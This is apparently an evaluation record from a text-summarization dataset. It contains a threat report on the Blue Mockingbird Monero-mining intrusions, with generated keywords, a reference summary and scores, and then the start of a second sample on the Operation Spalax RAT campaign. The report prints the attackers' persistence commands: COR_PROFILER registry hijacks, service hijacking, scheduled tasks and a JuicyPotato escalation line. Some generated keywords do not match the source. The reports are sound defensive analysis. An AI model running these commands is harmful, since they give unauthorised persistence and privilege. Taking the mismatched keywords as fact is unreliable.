\u2022 DETECTION AND RESPONSE TONY LAMBERTBlue Mockingbird is the name we\u2019ve given to a cluster of similar activity we\u2019ve observed involving Monero cryptocurrency- mining payloads in dynamic-link library (DLL) form on Windows systems. They achieve initial access by exploiting public- facing web applications, specifically those that use Telerik UI for ASP.NET, followed by execution and persistence using multiple techniques (check out my colleague Jesse Brown\u2019s new blog for details on Blue Mockingbird\u2019s COR_PROFILER persistence mechanism). During at least one incident, the adversary used proxying so ware and experimented with di erent kinds of reverse shell payloads to connect to external systems. The earliest Blue Mockingbird tools we\u2019ve observed were created in December 2019.Gaining entryIn at least two incident response (IR) engagements, Blue Mockingbird has exploited public-facing web applications (T1190: Exploit Public-Facing Application) that implemented Telerik UI for ASP.NET AJAX. This suite of user interface components accelerates the web development process, but some versions are susceptible to a deserialization vulnerability, CVE-2019- 18935. The exploitation of this CVE is not unique to Blue Mockingbird, but it has been a common point of entry.url Mockingbird activity mines Monero cryptocurrencyIn exploiting this vulnerability, two DLLs are uploaded to a web application running on a Windows IIS web server. In telemetry, investigators will notice w3wp.exe writing the DLLs to disk and then immediately loading them into memory a erward. In some cases, this will cause w3wp.exe to temporarily freeze and fail to successfully serve HTTP responses.For a diagnostic to determine whether you are potentially a ected by the Telerik CVE, you can search the IIS access logs for the string POST Telerik.Web.UI.WebResource.axd. In victim environments, our IR partners found entries similar to /Telerik.Web.UI.WebResource.axd type=rau 80 - Mozilla/5.0+ (Windows+NT+10.0;+Win64;+x64;+rv:54.0)+Gecko/20100101+Firefo - 200 0 0 625 /Telerik.Web.UI.WebResource.axd type=rau 80 - Mozilla/5.0+ (Windows+NT+10.0;+Win64;+x64;+rv:54.0)+Gecko/20100101+Firefo - 500 0 0 46In the entries, the string 200 refers to HTTP response code 200 where the POST request was successful, and the string 500 refers to HTTP code 500 where the POST request was not processed successfully by the web server. These code 500 entries happened when the w3wp.exe process loaded the uploaded DLLs into memory and temporarily froze.Searching the IIS access logs for entries like these is a good idea even if you don\u2019t explicitly know whether you use Telerik UI, as some web applications require the suite as a dependency behind the scenes.If you have endpoint detection and response (EDR) or similar tools, you\u2019ll notice cmd.exe or other suspicious processes spawning from w3wp.exe.Execution and evasionThe primary payload distributed by Blue Mockingbird is a version of XMRIG packaged as a DLL. XMRIG is a popular, open- source Monero-mining tool that adversaries can easily compile into custom tooling. During the incidents, we noted three distinct uses.The first use was execution with rundll32.exe explicitly calling the DLL export fackaaxv (T1218.011: Rundll32). This export seems unique to this actor\u2019s payloads and doesn\u2019t seem to happen other places in the wild:rundll32.exe dialogex.dll,fackaaxvThe next use was execution using regsvr32.exe using the /s command-line option (T1218.010: Regsvr32). Supplying the /s switch executes the DllRegisterServer export exposed by the DLL payload. This export ultimately passed control of execution into the function that fackaax exported:url Mockingbird activity mines Monero cryptocurrencyregsvr32.exe /s dialogex.dllThe final execution path was with the payload configured as a Windows Service DLL (T1569.002: Service Execution). Once configured, execution of the service invoked the export ServiceMain, which again passed control to fackaaxv.Come for the exploit, stay for the miningBlue Mockingbird leveraged multiple techniques for persistence during incidents. The most novel technique was the use of a COR_PROFILER COM hijack to execute a malicious DLL and restore items removed by defenders (T1559.001: Component Object Model). To use COR_PROFILER, they used wmic.exe and Windows Registry modifications to set environment variables and specify a DLL payload.wmic ENVIRONMENT where \"name='COR_PROFILER'\" wmic ENVIRONMENT create name=\"COR_ENABLE_PROFILING\",username=\"\",VariableValue=\"1\" wmic ENVIRONMENT create name=\"COR_PROFILER\",username=\"\",VariableValue=\"\" REG.EXE ADD HKEY_LOCAL_MACHINE\\Software\\Classes\\CLSID\\\\InProcServer32 /V ThreadingModel /T REG_SZ /D Apartment /F REG.EXE ADD HKEY_LOCAL_MACHINE\\Software\\Classes\\CLSID\\\\InProcServer32 /VE /T REG_SZ /D \"c:\\windows\\System32\\e0b3489da74f.dll\" /FThe payload DLL specified as a COR_PROFILER was simple and gathered few antivirus detections. It executed the following command:cmd.exe /c sc config wercplsupport start= auto && sc start wercplsupport && copy c:\\windows\\System32\\dialogex.dll c:\\windows\\System32\\wercplsupporte.dll /y && schtasks /create /tn \"Windows Problems Collection\" /tr \"regsvr32.exe /s c:\\windows\\System32\\wercplsupporte.dll\" /sc DAILY /st 20:02 /F /RU System && start \"\" regsvr32.exe /s c:\\windows\\System32\\dialogex.dllurl Mockingbird activity mines Monero cryptocurrencySince COR_PROFILER was configured, every process that loaded the Microso  .NET Common Language Runtime would execute the command above, re-establishing persistence. The command configured the Windows Problem Reports and Solutions Control Panel Support service to execute automatically at boot (T1543.003: Windows Service). In a separate command, the actor modified the existing wercplsupport service to use the miner DLL instead of the legitimate one:reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\wercpl /f /v ServiceDll /t REG_EXPAND_SZ /d \"c:\\windows\\System32\\wercplsupporte.dll\"Note that the actor used the DLL name wercplsupporte.dll as an attempt to masquerade as the legitimate DLL name, which is wercplsupport.dll (T1036.005: Match Legitimate Name or Location). In addition, more masquerading was used to make malicious Scheduled Tasks blend in with legitimate ones (T1053.005: Scheduled Task).In some cases, the actor even created a new service to perform the same actions as the COR_PROFILER payload:sc create 8995 binPath= \"cmd /c sc config wercplsupport start= auto & sc start wercplsupport & copy c:\\windows\\System32\\8995.dll c:\\windows\\System32\\wercplsupporte.dll /y & regsvr32.exe /s c:\\windows\\System32\\8995.dll\" type= share start= auto error= ignore DisplayName= 8995Escalating privileges and accessing credentialsIt\u2019s worth noting that Blue Mockingbird\u2019s initial access does not provide the privileges needed to establish the many persistence mechanisms used. In one engagement we observed, the adversary using a JuicyPotato exploit to escalate privileges from an IIS Application Pool Identity virtual account to the NT Authority\\SYSTEM account. JuicyPotato allowsurl Mockingbird activity mines Monero cryptocurrencyan attacker to abuse the SeImpersonate token privilege and Windows DCOM to move from an unprivileged account to the highest level of privilege on a system (T1068: Exploitation for Privilege Escalation). During this engagement, the attacker abused a DCOM class and leveraged the IIS Application Pool Identity\u2019s SeImpersonate privilege to perform the escalation:c:\\programdata\\let.exe -t t -p c:\\programdata\\rn.bat -l 1234 -c {8BC3F05E-D86B- 11D0-A075-00C04FB68820}In another engagement, we observed the adversary using Mimikatz (the o icial signed version) to access credentials for logon (T1003.001: LSASS Memory).Free to move around the networkAs with other adversaries that mine cryptocurrency opportunistically, Blue Mockingbird likes to move laterally and distribute mining payloads across an enterprise. We observed Blue Mockingbird move laterally using a combination of the Remote Desktop Protocol to access privileged systems and Windows Explorer to then distribute payloads to remote systems (T1021.001 Remote Desktop Protocol, T1021.002 SMB/Windows Admin Shares). In some cases, Scheduled Tasks were created remotely with schtasks.exe /S to ensure execution.schtasks /create /tn \"setup service Management\" /tr \"c:\\windows\\temp\\rn.bat\" /sc ONCE /st 00:00 /F /RU System /S remote_hostA look at command and controlA novel aspect of this adversary is that their toolkit does not appear to be fully defined. In at least one engagement, we observed Blue Mockingbird seemingly experimenting with di erent tools to create SOCKS proxies (T1090: Proxy) for pivoting. These tools included a fast reverse proxy (frp), Secure Socket Funneling (SSF), and Venom. In one instance, the adversary also tinkered with PowerShell reverse TCP shells and a reverse shell in DLL form (T1059.001: PowerShell).Take actionurl Mockingbird activity mines Monero cryptocurrencyWe\u2019ve scratched the surface on the XMRIG DLL payload, but we can dive deeper to understand more details (T1496: Resource Hijacking). First, the export fackaaxv has been consistently present in the DLLs. Next, each DLL also contains a PE binary section _RANDOMX. This section appears unique to cryptocurrency-mining payloads because it houses the RandomX proof of work algorithm that XMRIG may use. The network connections made for mining usually involve a nanopool[.]org domain.We made the assessment that the payload was actually XMRIG based on several pieces of evidence. First, there were multiple references to \u201cxmrig\u201d, including version numbers, in the binary strings. These were accompanied by cleartext references to command-line options common to XMRIG:coindonate-levelmax-cpu-usagecpu-prioritylog-fileThe final piece of evidence came from a text log written to disk by some versions of the miner DLL. In the text logs, identifying information for XMRIG was output alongside hardware details for the victim system.* ABOUT XMRig/5.3.0 MSVC/2015 * LIBS libuv/1.31.0 OpenSSL/1.1.1c hwloc/2.1.0 * HUGE PAGES unavailable * 1GB PAGES unavailableurl Mockingbird activity mines Monero cryptocurrency* CPU Intel(R) Core(TM) i7-4770 CPU @ 3.40GHz (1) x64 AES L2:0.3 MB L3:8.0 MB 1C/1T NUMA:1 * MEMORY 1.3/4.0 GB (33%) * POOL #1 xmr-au1.nanopool.org:14433 coin * COMMANDS 'h' hashrate, 'p' pause, 'r' [2020-04-16 08:30:26.753] [xmr- au1.nanopool.org:14433] DNS error: \"unknown node or service\"Each payload comes compiled with a standard list of commonly used Monero-mining domains alongside a Monero wallet address. So far, we\u2019ve identified two wallet addresses used by Blue Mockingbird that are in active circulation. Due to the private nature of Monero, we cannot see the balance of these wallets to estimate their success. We\u2019ve seen mining payloads compiled as early as December 2019 and as recently as late April 2020. In each compilation, one of the two wallets has been embedded into the binary. The wallet addresses could be extracted from the binaries easily in earlier versions using a simple strings command. In newer versions, the string is obfuscated.Even with string obfuscation in the binary, you can observe the wallet addresses in network tra ic. During execution of the techniques used by Blue Mockingbird will bypass whitelisting technologies, so the best route will be to inhibit initial access. Consider establishing a baseline of Windows Scheduled Tasks in your environment to know what is normal across your enterprise.Let\u2019s collaborate!If you\u2019ve been tracking similar activity, we\u2019d love to hear from you and collaborate. Contact blog@redcanary.com with any time12/19/2019 17:49:201/4/2020 12:00:232/6/2020 10:24:292/6/2020 10:24:292/19/2020 13:52:102/22/2020 14:38:333/8/2020 16:57:323/24/2020 time3/24/2020 16:15:444/9/2020 16:05:454/14/2020 19:00:062020-04-26 14:58:24compile 9:24:302020-02- 22 ARTICLESMAY 7, 2020 DETECTION AND RESPONSEDetecting COR_PROFILER manipulation for persistenceurl Mockingbird activity mines Monero cryptocurrencyAPRIL 28, 2020 DETECTION AND RESPONSELateral Movement with Secure Shell (SSH)MARCH 26, 2020 DETECTION AND RESPONSE2020 Threat Detection Report: the conversation continuesMARCH 18, 2020 DETECTION AND RESPONSEWorms shape the narrative in Red Canary\u2019s 2020 Threat Detection ReportSubscribe to our blogEmail AddressSUBSCRIBESee what it's likeDemourl have a partner in the fight.Blue Mockingbird activity mines Monero cryptocurrencyExperience the di erence between a sense of security and actual security.PRODUCTSSOLUTIONSRESOURCESBLOGATOMIC RED TEAMCOMPANYCONTACT USDEMOSUBSCRIBE TO OUR NEWSLETTER\u00a9 2014-2020 Red Canary. All rights reserved.info@redcanary.com+1 855-977-0686Privacy Policyurl ", "generated_text": "Blue Mockingbird; exploitation; public-facing web applications; Telerik UI; ASP.NET; Decrypt; persistence; techniques; proxying; data; Proxy; COR_PROFILER; a DLL; XMRIG; a payload; the w3wp.exe process; w3wp.exe; a decryption key; the DLL; an initial access; dynamic-link library; DLLs; the AJAX web development process; execution; persistence; several techniques; decryption; XMRIG; a DLL; process injection; the TCP; a DLL; an arbitrary encoding; the key; the encoding; a swiping key; a server; the decryption key; the decryption key; the decryption key; a payload; the server; the decryption key; the decryption key; the decryption key; the internal encryption key; the C2 IP; the C2 server; the C2 server; the decryption key; the process injection key", "ref_text": "<START-1>The document describes a threat actor called Blue Mockingbird that has been deploying Monero cryptocurrency mining malware on Windows machines across multiple organizations. Blue Mockingbird gains initial access by exploiting the CVE-2019-18935 vulnerability in Telerik UI web applications. The attacker leverages the privileges of a DCOM class and IIS Application Pool Identity's SeImpersonate privilege to perform the escalation. Once in, they use various techniques like process injection, DLL sideloading, and privilege escalation to deploy and persist a malicious Monero miner built on XMRig. The miner payload communicates with external mining pools to mine Monero. Blue Mockingbird uses lateral movement techniques like RDP and Windows admin shares to distribute the payload across the network. Blue Mockingbird appears to experiment with different tools, such as Fast Reverse Proxy (frp), Secure Socket Funneling (SSF), and Venom, to pivot between systems. They have also experimented with different reverse shell and proxy tools for command and control. Persistence mechanisms involve hijacking services like wercplsupport using COR_PROFILER COM hijacking. The malware compiles each payload with a list of commonly used Monero-mining domains and a wallet address, which can be extracted from the binary or observed in network traffic. Red Canary provides indicators of compromise like file hashes, Monero wallet addresses, and analytics to detect the miner payloads, privilege escalation, and lateral movement. They also advise patching public-facing apps and establishing a baseline of normal scheduled tasks. In summary, the document analyzes a sophisticated, evolving threat actor distributing stealthy cryptocurrency miners using multiple intrusion techniques across victim networks. <END-1>", "t5/keyword/hint_hit_precision": 0.1568627450980392, "t5/word/hint_hit_recall": 0.043824701195219126, "gpt3/lexical/rouge_rouge1": 0.39560439560439564, "gpt3/lexical/rouge_rouge2": 0.14917127071823205, "gpt3/lexical/rouge_rougeL": 0.19780219780219782, "gpt3/lexical/rouge_rougeLsum": 0.19780219780219782, "gpt3_generated_text": ["Blue Mockingbird is a threat actor group that has been observed deploying Monero cryptocurrency-mining payloads in DLL form on Windows systems by exploiting public-facing web applications, specifically those using Telerik UI for ASP.NET. The group gains initial access through a deserialization vulnerability (CVE-2019-18935) and achieves execution and persistence using various techniques, including COR_PROFILER persistence mechanism and proxying. The primary payload distributed by Blue Mockingbird is XMRIG, a Monero-mining tool, which is executed using rundll32.exe and regsvr32.exe. Detection strategies for Process Injection, the most prevalent ATT&CK technique associated with Blue Mockingbird, are crucial for defending against this threat."]}, {"split_name": "val", "sample_id": "val_92", "prompt_text": "Extract the keywords: Operation Spalax: Targeted malware attacks in Colombiawelivesecurity.com/2021/01/12/operation-spalax-targeted-malware-attacks-colombiaJanuary 12, 2021In 2020 ESET saw several attacks targeting Colombian entities exclusively. These attacks are still ongoing at the time of writing and are focused on both government institutions and private companies. For the latter, the most targeted sectors are energy and metallurgical. The attackers rely on the use of remote access trojans, most likely to spy on their victims. They have a large network infrastructure for command and control: ESET observed at least 24 different IP addresses in use in the second half of 2020. These are probably compromised devices that act as proxies for their C&C servers. This, combined with the use of dynamic DNS services, means that their infrastructure never stays still. We have seen at least 70 domain names active in this timeframe and they register new ones on a regular basis.The attackersThe attacks we saw in 2020 share some TTPs with previous reports about groups targeting Colombia, but also differ in many ways, thus making attribution difficult.One of those reports was published in February 2019, by QiAnXin researchers. The operations described in that blogpost are connected to an APT group active since at least April 2018. We have found some similarities between those attacks and the ones that we describe in this article:We saw a malicious sample included in IoCs of QiAnXin\u2019s report and a sample from the new campaign in the same government organization. These files have fewer than a dozen sightings each. Some of the phishing emails from the current campaign were sent from IP addresses corresponding to a range that belongs to Powerhouse Management, a VPN service. The same IP address range was used for emails sent in the earlier campaign. The phishing emails have similar topics and pretend to come from some of the same entities \u2013 for example, the Office of the Attorney General (Fiscalia General de la Nacion) or the National Directorate of Taxes and Customs (DIAN). Some of the C&C servers in Operation Spalax use linkpc.net and publicvm.com subdomains, along with IP addresses that belong to Powerhouse Management. This also happened in the earlier campaign.However, there are differences in the attachments used for phishing emails, the remote access trojans (RATs) used and in most of the operator\u2019s C&C infrastructure.There is also this report from Trend Micro, from July 2019. There are similarities between the phishing emails and parts of the network infrastructure in that campaign and the one we describe here. The attacks described in that article were connected to cybercrime, not espionage. While we have not seen any payload delivered by the attackers other than RATs, some of the targets in the current campaign (such as a lottery agency) don\u2019t make much sense for spying activities.These threat actors show perfect usage of the Spanish language in the emails they send, they only target Colombian entities, and they use premade malware and don\u2019t develop any themselves.Attack overviewTargets are approached with emails that lead to the download of malicious files. In most cases, these emails have a PDF document attached, which contains a link that the user must click to download the malware. The downloaded files are regular RAR archives that have an executable file inside. These archives are hosted in legitimate file hosting services such as OneDrive or MediaFire. The target has to manually extract the file and execute it for the malware to run.We\u2019ve found a variety of packers used for these executables, but their purpose is always to have a remote access trojan running on the victimized computer, usually by decrypting the payload and injecting it into legitimate processes. An overview of a typical attack is shown in Figure 1. We have seen the attackers use three different RATs: Remcos, njRAT and AsyncRAT.1/15Phishing emailsFigure 1. Overview of the attackThe attackers use various topics for their emails, but in most cases they are not specially crafted for their victims. On the contrary, most of these emails have generic topics that could be reused for different targets.We found phishing emails with these topics:A notification about a driving infraction A notification to take a mandatory COVID-19 test A notification to attend a court hearing An open investigation against the recipient for misuse of public funds A notification of an embargo of bank accountsThe email shown in Figure 2 pretends to be a notification about a driving infraction for a value of around US$250. There is a PDF file attached that promises a photo of the infraction, as well as information about time and place of the incident. The sender has been spoofed to make the email look like it is coming from SIMIT (a system for paying transit violations in Colombia).2/15Figure 2. Example of a phishing emailThe pdf file only contains an external link that has been shortened with the acortaurl service, as shown in Figure 3. The shortened URL is: url the shortened link is expanded, a RAR archive is downloaded from: url 3. PDF attached to phishing email3/15Figure 4 shows part of the email\u2019s header. The spoofed sender is notificacionesmultas@simit.org[.]co but we can see that the real sender is IP address 128.90.108[.]177, which is connected with the domain name julian.linkpc[.]net, as found in historic DNS data. It\u2019s not a coincidence that the same domain name is used for contacting the C&C server in the malicious sample contained in the RAR archive. This IP address belongs to Powerhouse Management, a VPN service provider.Figure 4. Header of a phishing emailIn more recent emails, the shortened link in the PDF file resolves to url (a legitimate site) when visited from outside of Colombia.Also, in some cases the GetResponse service has been used to send the email. This is probably done to track whether the victim has clicked on the link. In these cases there is no attachment: a link to the GetResponse platform leads to the download of malware.You can see the other emails in the following gallery (click to enlarge):Figures 5 to 13. Various phishing emails and their attached files4/15Malicious artifactsDroppersThe executable files contained in compressed archives that are downloaded via the phishing emails are responsible for decrypting and running remote access trojans on a victimized computer. In the following sections, we describe the various droppers we have seen.5/15NSIS installersThe dropper that is most commonly used by these attackers comes as a file that was compiled with NSIS (Nullsoft Scriptable Install System). To try to evade detection, this installer contains several benign files that are written to disk (they are not part of NSIS binaries and they are not used at all by the installer) and two files that are malicious: an encrypted RAT executable and a DLL file that decrypts and runs the trojan. An NSIS script for one of these installers is shown in Figure 14. The benign files are usually different in different droppers used by the attackers.Figure 14. NSIS script for one of the droppers; the malicious files arehighlightedThe files Bonehead (encrypted RAT) and ShoonCataclysm.dll (dropper DLL) are written in the same folder and the DLL is run with rundll32.exe using Uboats as its argument. The names of these files change between executables. Some more examples are:rundll32.exe Blackface,Breathing rundll32.exe OximeLied,Hostage rundll32.exe Conservatory,PigginsWe used the name of the benign files contained in some of these NSIS installers to find more malicious installers used by the Spalax operators. Table 1 lists details of three different NSIS installers used by the attackers that contained all the same benign files. The only difference among them was the encrypted file, which pointed to different C&C servers.Table 1. NSIS installers with identical benign files used by this groupSHA-1C&C6/15SHA-1C&C6E81343018136B271D1F95DB536CA6B2FD1DFCD6 marzoorganigrama20202020.duckdns[.]org7EDB738018E0E91C257A6FC94BDBA50DAF899F90 ruthy.qdp6fj1uji[.]xyz812A407516F9712C80B70A14D6CDF282C88938C1dominoduck2098.duckdns[.]orgHowever, we also found malicious NSIS installers used by other unrelated groups that had the same benign files as the ones used by this group. Figure 15 lists the files contained in two different NSIS installers. The one on the left (SHA-1: 3AC39B5944019244E7E33999A2816304558FB1E8) is an executable used by this group and the one on the right (SHA-1: 6758741212F7AA2B77C42B2A2DE377D97154F860) is unrelated. The SHA-1 hashes for all the benign files are the same (and also the filenames) and even the malicious DLL is the same. However, the encrypted file Bonehead is different.Figure 15. Files contained in NSIS droppers from unrelated campaignsThis means that these installers were generated with the same builder, but by different actors. The builder is probably offered in underground forums and includes these benign files. This, along with a complete analysis of the dropper, was described earlier this year by Sophos in their RATicate article. There is also an article by Lab52 describing one of the NSIS installers used in Operation Spalax, which they attribute to APT-C-36.In the vast majority of cases these NSIS droppers decrypt and run the Remcos RAT, but we have also seen cases where the payload is njRAT. These will be described later in the Payloads section.Agent Tesla packersWe have seen several droppers that are different variants of a packer that uses steganography and is known to be used in Agent Tesla samples. Interestingly, the attackers use various payloads, but none of them are Agent Tesla. Even though there are differences in all the samples regarding the layers of encryption, obfuscation or anti-analysis used, we can summarize the actions taken by the droppers as follows:The dropper reads a string (or binary data) from its resource section and decrypts it. The result is a DLL that will be loaded and called in the same address space. The DLL reads pixels from an image contained in the first binary and decrypts another executable. This one is loaded and executed in the same address space. This new executable is packed with CyaX. It reads data from its own resource section and decrypts a payload. There are anti- analysis checks; if they pass, the payload can be injected into a new process or loaded in the same process space.The initial dropper is coded in C#. In all the samples that we have seen, the code for the dropper was hiding in non-malicious code, probably copied from other apps. The benign code is not executed; it\u2019s there to evade detection.7/15In Figure 16 we see an example of the resources contained in one of these droppers. The text in green (only shown partially) is a string that will be decrypted to generate the next stage to be executed and the image that we see below the green text will be decrypted by the second stage malware. The algorithm used for decryption of the string varies from sample to sample, but sometimes the resource is just an unencrypted binary.Figure 16. Resources contained in Agent Tesla\u2019s packerThe method to be executed in the DLL is always named StartGame or StartUpdate. It reads the image from the first executable, and stores every pixel as three numbers according to its red, green and blue components. Then it decrypts the array by doing a single- byte XOR operation, cycling through the key. After that, the array is gzip-decompressed and executed. Part of the code for the mentioned operations is shown in Figure 17.8/15Figure 17. Code to decrypt and run the third-stage malwareThe third stage is in charge of decrypting and running the payload. The .NET packer known as CyaX is used to perform this task. The version of the packer used by the attackers is v4, although they used v2 in some cases. Figure 18 shows the hardcoded configuration for one of their samples.Figure 18. Hardcoded configuration in CyaX-Sharp packerThe decryption of the payload is based on XOR operations and is the same as the algorithm previously shown but with an extra step: the payload is XORed with its first 16 bytes as a key. Once it\u2019s decrypted, it can be run in the same address space or injected into a different process, depending on the configuration.9/15This packer supports various anti-analysis operations such as disabling Windows Defender, checking for security products, and detecting virtual environments and sandboxes.The majority of the payloads for these droppers are njRAT, but we have also seen AsyncRAT. We saw Remcos in one of these droppers, but the code in the packer was different. Part of the main routine for the injection of the payload is shown in Figure 19.Figure 19. Code for the last stage of a dropperWe have noticed that the configuration is contained in different variables. Values like #startup_method# or #bind# mean that the configuration was not set for those options. The payload is read from an encrypted resource and XORed with a hardcoded password. The shellcode that performs the injection is contained in an array and is dynamically loaded. There are no anti-analysis checks or protection mechanisms.AutoIt droppersFor some of their droppers, the attackers have used an AutoIt packer that comes heavily obfuscated. Unlike the cases that were previously described, in this case the first-stage malware performs the injection and execution of the payload. It does so by using two shellcodes contained in the compiled AutoIt script: one to decrypt the payload and another to inject it into some process.The payload is constructed by concatenating several strings, as shown in Figure 20. By inspecting the last two characters, we can see that the string is in reverse order.10/15The routine that decrypts the payload contains a small shellcode that is loaded with VirtualAlloc and executed. The decryption done by the shellcode is based on a single-byte XOR algorithm. The code that loads the shellcode is shown in Figure 21.Figure 20. Concatenation of the payloadWe can see that the shellcode is stored encrypted. In fact, before deobfuscating the script, all strings were encrypted with this same XOR-based algorithm. The decryption routine used is shown in Figure 22.Figure 21. Execution of shellcode to decrypt the payload11/15Figure 22. Routine to decrypt stringsOnce the payload is decrypted, a shellcode with RunPE code is used to perform the injection. The shellcode is concatenated in the same manner as the payload and executed like the previous shellcode.To achieve persistence, a VBS script is created to execute a copy of the dropper (which is renamed to aadauthhelper.exe). Then an Internet Shortcut (.url) file is created in the Startup folder to execute the script. The code that generates these files is shown in Figure 23.The dropper contains code that is not executed. It can:Figure 23. Code for persistence in AutoIt droppers12/15Check for VMware and VirtualBox Delete the dropper executable Run the dropper continuously Download and execute files Terminate if a \u201cProgram Manager\u201d window is found Read a binary from its resource section, write it to disk and execute it Modify the security descriptor (ACL) for the injected processFor more information see this analysis by Morphisec where similar AutoIt droppers were used with Frenchy shellcode.PayloadsThe payloads used in Operation Spalax are remote access trojans. These provide several capabilities not only for remote control, but also for spying on targets: keylogging, screen capture, clipboard hijacking, exfiltration of files, and the ability to download and execute other malware, to name a few.These RATs were not developed by the attackers. They are:Remcos, sold online njRAT, leaked in underground forums AsyncRAT, open sourceThere is not a one-to-one relationship between droppers and payloads, as we have seen different types of droppers running the same payload and also a single type of dropper connected to different payloads. However, we can state that NSIS droppers mostly drop Remcos, while Agent Tesla and AutoIt packers typically drop njRAT.Remcos is a tool for remote control and surveillance. It can be purchased with a six-month license that includes updates and support. There is also a free version with limited functionalities. While the tool can be used for legitimate purposes, it is also used by criminals to spy on their victims.Most of the Remcos samples used by this group are v2.5.0 Pro, but we have also seen all versions that were released since September 2019, which may indicate that the attackers bought a license after that month and have been actively using the different updates that they received during their six month license period.Regarding njRAT, this group mostly uses v0.7.3 (also known as the Lime version). That version includes functionalities such as DDoS or ransomware encryption, but only spy features such as keylogging are used by the attackers. For a more complete description of this version, refer to this 2018 article by Zscaler.Another njRAT version used by the attackers is v0.7d (the \u201cgreen edition\u201d) which is a simpler version focused on spying capabilities: keylogging, taking screenshots, access to webcam and microphone, uploading and downloading files, and executing other binaries.The final type of payload that we will mention is AsyncRAT. In all cases we have observed v0.5.7B, which can be found on GitHub, has been used. The functionalities in this RAT are similar to those in the previously mentioned RATs, which allow attackers to spy on their victims.Network infrastructureDuring our research we saw approximately 70 different domain names used for C&C in the second half of 2020. This amounts to at least 24 IP addresses. By pivoting on passive DNS data for IP addresses and known domain names, we found that the attackers have used at least 160 additional domain names since 2019. This corresponds to at least 40 further IP addresses.They\u2019ve managed to operate at such scale by using Dynamic DNS services. This means that they have a pool of domain names (and also register new ones on a regular basis) that are dynamically assigned to IP addresses. This way a domain name can be related to several IP addresses over a period of time and IP addresses can be related to many domain names. Most of the domain names we have seen were registered with Duck DNS, but they have also used DNS Exit for publicvm.com and linkpc.net subdomains.Regarding IP addresses, almost all of them are in Colombia. Most are IP addresses related to Colombian ISPs: 60% of them are Telmex and 30% EPM Telecomunicaciones (Tigo). As it is highly unlikely that the criminals own so many residential IP addresses, it is possible that they use some victims as proxies, or some vulnerable devices to forward communication to their real C&C servers.Finally, a subset of the IP addresses belongs to Powerhouse Management, a VPN service provider. They are used in conjunction with DNS Exit subdomains. Similar findings can be found in this analysis by Lab52.ConclusionTargeted malware attacks against Colombian entities have been scaled up since the campaigns that were described last year. The landscape has changed from a campaign that had a handful of C&C servers and domain names to a campaign with very large and fast-changing infrastructure with hundreds of domain names used since 2019. Even though TTPs have seen changes, not only in13/15how malware is delivered in phishing emails but also in the RATs used, one aspect that remains the same is that the attacks are still targeted and focused on Colombian entities, both in the public and private sectors. It should be expected that these attacks will continue in the region for a long time, so we will keep monitoring these activities.A comprehensive list of Indicators of Compromise (IoCs) and samples can be found in our GitHub repository.For any inquiries, or to make sample submissions related to the subject, contact us at threatintel@eset.com.MITRE ATT&CK techniquesNote: This table was built using version 7 of the MITRE ATT&CK framework.TacticInitial AccessIDNameDescriptionT1566.001 Phishing: SpearphishingAttachmentThe attackers have used emails with PDF or RTF files attached that contain a link to download malware.T1566.002 Phishing: SpearphishingLinkThe attackers have used emails with a link to download malware.ExecutionT1059.005 Command and Scripting Interpreter: Visual BasicThe attackers have used droppers that dump VBS files with commands to achieve persistence.T1059.003 Command and ScriptingInterpreter: Windows Command ShellT1106Native APIThe attackers have used RATs that can launch a command shell for executing commands.The attackers have used API calls in their droppers, such as CreateProcessA, WriteProcessMemory and ResumeThread, to load and execute shellcode in memory.T1204.001 User Execution: MaliciousLinkThe attackers have attempted to get users to open a malicious link that leads to the download of malware.T1204.002 User Execution: MaliciousFileThe attackers have attempted to get users to execute malicious files masquerading as documents.Persistence T1547.001 Boot or Logon Initialization Scripts: Registry Run Keys / Startup FolderThe attackers have used RATs that persist by creating a Run registry key or by creating a copy of the malware in the Startup folder.T1053.005 Scheduled Task/Job:Scheduled TaskThe attackers have used scheduled tasks in their droppers and payloads to achieve persistence.Privilege EscalationT1548.002 Abuse Elevation Control Mechanism: Bypass User Access ControlThe attackers have used RATs that implement UAC bypassing.Defense EvasionT1140Deobfuscate/Decode Files or InformationThe attackers have used various encryption algorithms in their droppers to hide strings and payloads.T1562.001 Impair Defenses: Disable orModify ToolsThe attackers have used CyaX packer, which can disable Windows Defender.T1070.004 Indicator Removal on Host:File DeletionT1112Modify RegistryT1027.002 Obfuscated Files orInformation: Software PackingT1027.003 Obfuscated Files orInformation: SteganographyThe attackers have used malware that deletes itself from the system.The attackers have used RATs that allow full access to the Registry, for example to clear traces of their activities.The attackers have used various layers of packers for obfuscating their droppers.The attackers have used packers that read pixel data from images contained in PE files\u2019 resource sections and build the next layer of execution from the data.T1055.002 Process Injection: PortableExecutable InjectionThe attackers have used droppers that inject the payload into legitimate processes such as RegAsm.exe, MSBuild.exe and more.T1497.001 Virtualization/SandboxEvasion: System ChecksThe attackers have used droppers and payloads that perform anti- analysis checks to detect virtual environments and analysis tools.Credential AccessT1555.003 Credentials from PasswordStores: Credentials from Web BrowsersThe attackers have used various RATs with modules that steal passwords saved in victim web browsers.14/15TacticIDNameDescriptionDiscoveryT1010Application Window DiscoveryThe attackers have used droppers and RATs that gather information about opened windows.T1083T1120File and Directory DiscoveryThe attackers have used various RATs that can browse file systems.Peripheral Device DiscoveryThe attackers have used njRAT, which attempts to detect if the victim system has a camera during the initial infection.T1057Process DiscoveryThe attackers have used various RATs with modules that show running processes.T1012T1018Query RegistryThe attackers have used various RATs that can read the Registry.Remote System DiscoveryThe attackers have used njRAT, which can identify remote hosts on connected networks.T1518.001 Software Discovery: SecuritySoftware DiscoveryThe attackers have used droppers that check for security software present in a victim\u2019s computer.T1082T1016T1049T1033System Information DiscoveryThe attackers have used various RATs that gather system information such as computer name and operating system during the initial infection.System Network Configuration DiscoveryThe attackers have used various RATs that can collect the IP address of the victim machine.System Network Connections DiscoveryThe attackers have used various RATs that can list network connections on a victim\u2019s computer.System Owner/User DiscoveryThe attackers have used various RATs that retrieve the current username during initial infection.T1007System Service DiscoveryThe attackers have used various RATs that have modules to manage services on the system.T1021.001 Remote Services: RemoteDesktop ProtocolThe attackers have used various RATs that can perform remote desktop access.T1091Replication Through Removable MediaThe attackers have used njRAT, which can be configured to spread via removable drives.CollectionT1123Audio CaptureT1115Clipboard DataThe attackers have used various RATs that can capture audio from the system\u2019s microphone.The attackers have used various RATs that can access and modify data from the clipboard.T1005Data from Local SystemThe attackers have used various RATs that can access the local file system and upload, download or delete files.T1056.001 Input Capture: KeyloggingThe attackers have used various RATs that have keylogging capabilities.T1113Screen CaptureT1125Video CaptureThe attackers have used various RATs that can capture screenshots of victim machines.The attackers have used various 